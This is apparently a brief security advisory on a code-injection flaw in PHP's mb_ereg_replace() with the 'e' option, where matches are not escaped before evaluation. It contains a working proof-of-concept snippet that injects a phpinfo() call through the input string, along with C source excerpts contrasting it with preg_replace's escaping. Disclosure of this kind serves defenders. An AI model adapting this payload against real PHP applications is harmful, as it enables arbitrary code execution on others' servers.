PHP mb_ereg(i)_replace() Evaluate Replacement String Vulnerability
==================================================================


mb_ereg(i)_replace() evaluate replacement string vulnerability

when option parameter set e, matchs not be escaped.

ex:

<?php

function hi80vul() {}

$str = &#039;\&#039;, phpinfo(), \&#039;&#039;;
mb_ereg_replace(&#039;^(.*)$&#039;, &#039;hi80vul(\&#039;\1\&#039;)&#039;, $str, &#039;e&#039;);

?>

phpinfo() will be evaluated.

mb_ereg_replace()

    if ((replace_len - i) >= 2 && fwd == 1 &&
     p[0] == &#039;\\&#039; && p[1] >= &#039;0&#039; && p[1] <= &#039;9&#039;) {
     n = p[1] - &#039;0&#039;;
    }
    if (n >= 0 && n < regs->num_regs) {
     if (regs->beg[n] >= 0 && regs->beg[n] < regs->end[n] && regs->end[n] <= string_len) {
      smart_str_appendl(pbuf, string + regs->beg[n], regs->end[n] - regs->beg[n]);
// matchs not be escaped
     }
     

  if (&#039;\\&#039; == *walk || &#039;$&#039; == *walk) {
   smart_str_appendl(&code, segment, walk - segment);
   if (walk_last == &#039;\\&#039;) {
    code.c[code.len-1] = *walk++;
    segment = walk;
    walk_last = 0;
    continue;
   }
   segment = walk;
    if (backref < count) {
     /* Find the corresponding string match and substitute it
        in instead of the backref */
     match = subject + offsets[backref<<1];
     match_len = offsets[(backref<<1)+1] - offsets[backref<<1];
     if (match_len) {
      esc_match = php_addslashes_ex(match, match_len, &esc_match_len, 0, 1 TSRMLS_CC);
// matchs escaped by addslashes()
...
    smart_str_appendl(&code, esc_match, esc_match_len);



